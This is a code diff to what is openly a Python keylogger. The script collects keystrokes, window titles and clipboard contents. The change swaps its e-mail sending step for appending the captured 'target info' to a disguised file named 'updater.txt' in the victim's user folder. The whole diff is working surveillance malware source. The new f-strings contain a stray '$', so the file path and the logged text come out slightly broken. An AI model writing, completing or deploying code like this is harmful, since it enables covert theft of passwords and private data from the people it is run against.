@@ -120,7 +120,7 @@ def keylogger():
         if len(key_count_checker) < amount_of_keys_to_be_pressed:
             pass
         else:
-            send_email()
+            finish_and_write_info()
 
     def thread_to_start_check_keys():
         while True:
@@ -169,7 +169,7 @@ def keylogger():
     listen()
 
 
-def send_email():
+def finish_and_write_info():
     global clipboard_log
     def get_target_info():
         global final_target_info
@@ -201,7 +201,7 @@ def send_email():
         keys_pressed_to_send = ''
         # window_log_to_send = ''
 
-    def compile_and_send_email():
+    def compile_and_finish_and_write_info():
         global window_log
         global keys_pressed
         global clipboard_log
@@ -221,11 +221,15 @@ def send_email():
         all_clips = []
     get_target_info()
     print(final_target_info)
+    with open(f"C:\\Users\\${getpass.getuser()}\\updater.txt", "a") as file:
+        file.write(f"\n${final_target_info}")
+        file.close()
+
     window_log = []
     keys_pressed = []
     clipboard_log = []
     all_clips = []
-    # compile_and_send_email()
+    # compile_and_finish_and_write_info()
 
 
 keylogger()
